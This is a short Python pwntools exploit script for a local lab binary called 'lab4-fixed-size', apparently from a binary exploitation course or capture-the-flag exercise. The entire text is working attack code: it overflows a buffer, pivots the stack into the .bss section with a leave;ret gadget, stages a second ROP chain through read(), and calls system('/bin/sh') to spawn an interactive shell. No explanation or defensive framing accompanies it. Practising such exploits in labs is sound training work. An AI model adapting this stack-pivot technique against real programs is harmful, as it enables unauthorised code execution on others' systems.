import time
from pwn import *

p = process('./lab4-fixed-size')
elf = ELF('./lab4-fixed-size')
context.terminal = ["tmux", "splitw", "-h"]
gdb.attach(p)

buf1 = elf.bss()
buf2 = buf1 + 0x100
read_plt = elf.plt['read']
system_plt = elf.plt['system']
pop_off = 0x0804923e
leave_ret = 0x08049202

print(hex(buf1))

payload = b'A'*40

payload += p32(buf1) + p32(read_plt) + p32(leave_ret) + p32(buf2) + p32(100)
p.send(payload)
time.sleep(0.1)

payload = p32(buf1) + p32(system_plt) + p32(leave_ret) + p32(buf1+16) + b"/bin/sh\x00" + p32(leave_ret)
p.send(payload)

p.interactive()
